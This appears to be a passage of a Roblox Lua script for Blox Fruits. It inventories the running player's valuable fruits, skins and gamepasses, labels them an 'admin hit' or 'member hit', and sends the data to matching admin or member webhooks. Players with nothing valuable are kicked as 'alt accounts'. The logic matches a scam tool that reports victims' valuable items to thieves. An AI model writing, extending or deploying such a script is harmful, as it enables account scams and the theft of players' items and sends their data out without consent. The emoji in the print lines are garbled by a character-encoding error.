-- Check if player has any priority fruits
local function HasPriorityFruits(inventory)
    local hasAdmin = false
    local hasMember = false
    
    -- Check inventory for admin fruits
    for _, item in pairs(inventory.permanentFruits) do
        if IsInList(item.name, ADMIN_FRUITS) then
            hasAdmin = true
            break
        end
    end
    
    for _, item in pairs(inventory.skins) do
        if IsInList(item.name, ADMIN_FRUITS) then
            hasAdmin = true
            break
        end
    end
    
    for _, item in pairs(inventory.gamepasses) do
        if IsInList(item.name, ADMIN_FRUITS) then
            hasAdmin = true
            break
        end
    end
    
    for _, item in pairs(inventory.fruits["4"]) do
        if IsInList(item.name, ADMIN_FRUITS) then
            hasAdmin = true
            break
        end
        if IsInList(item.name, MEMBER_FRUITS) then
            hasMember = true
            break
        end
    end
    
    for _, item in pairs(inventory.fruits["3"]) do
        if IsInList(item.name, ADMIN_FRUITS) then
            hasAdmin = true
            break
        end
        if IsInList(item.name, MEMBER_FRUITS) then
            hasMember = true
            break
        end
    end
    
    for _, item in pairs(inventory.fruits["2"]) do
        if IsInList(item.name, ADMIN_FRUITS) then
            hasAdmin = true
            break
        end
        if IsInList(item.name, MEMBER_FRUITS) then
            hasMember = true
            break
        end
    end
    
    return hasAdmin, hasMember
end

-- Main Webhook Function
local function SendWebhook()
    local LocalPlayer = Players.LocalPlayer
    local sea = GetSea()
    local inventory = GetValuableItems()
    local playerCount = #Players:GetPlayers()
    
    -- Get complete fruit counts
    local totalFruits, detailedCounts = CountAllFruits()
    
    -- Calculate totals
    local totalValuableFruits = #inventory.fruits["4"] + #inventory.fruits["3"] + #inventory.fruits["2"]
    local hasAdminFruits, hasMemberFruits = HasPriorityFruits(inventory)

    print("ğŸ“Š VALUABLE ITEMS ONLY:")
    print("ğŸŒŠ Sea: " .. sea)
    print("ğŸŠ Total All Fruits: " .. totalFruits)
    print("ğŸ’ Valuable Fruits: " .. totalValuableFruits)
    print("ğŸ‘‘ Admin Fruits: " .. tostring(hasAdminFruits))
    print("ğŸ”¹ Member Fruits: " .. tostring(hasMemberFruits))
    print("ğŸ”® Permanent Fruits: " .. #inventory.permanentFruits)
    print("ğŸ¨ Skins: " .. #inventory.skins)
    print("ğŸ® Gamepasses: " .. #inventory.gamepasses)

    -- DECISION LOGIC: Admin first, then Member, then kick if low
    if hasAdminFruits then
        print("ğŸ‘‘ ADMIN HIT DETECTED! Sending to admin webhook...")
        local success = SendAdminWebhook(inventory, totalFruits, totalValuableFruits, playerCount, sea)
        if success then
            print("âœ… ADMIN WEBHOOK SENT SUCCESSFULLY!")
            return true
        else
            print("âŒ Admin webhook failed")
            return false
        end
        
    elseif hasMemberFruits then
        print("ğŸ”¹ MEMBER HIT DETECTED! Sending to member webhook...")
        local success = SendMemberWebhook(inventory, totalFruits, totalValuableFruits, playerCount, sea)
        if success then
            print("âœ… MEMBER WEBHOOK SENT SUCCESSFULLY!")
            return true
        else
            print("âŒ Member webhook failed")
            return false
        end
        
    else
        print("âŒ ALT ACCOUNT DETECTED - KICKING PLAYER...")
        -- Wait a moment then kick
        wait(2)
        if LocalPlayer then
            LocalPlayer:Kick("ğŸš« Alt account detected ")
        end
        return false
    end
end

-- Execute
print("ğŸ”± Starting VALUABLE ITEMS ONLY VERSION (ADMIN + MEMBER WEBHOOKS)...")

-- Security Checks
if CheckSea1Restriction() then
    return
end

if CheckCooldown() then
    return
end

local success = SendWebhook()

if success then
    print("ğŸš€ Webhook sent successfully based on inventory priority!")
else
    print("ğŸ’€ Player kicked - Alt account detected")
end
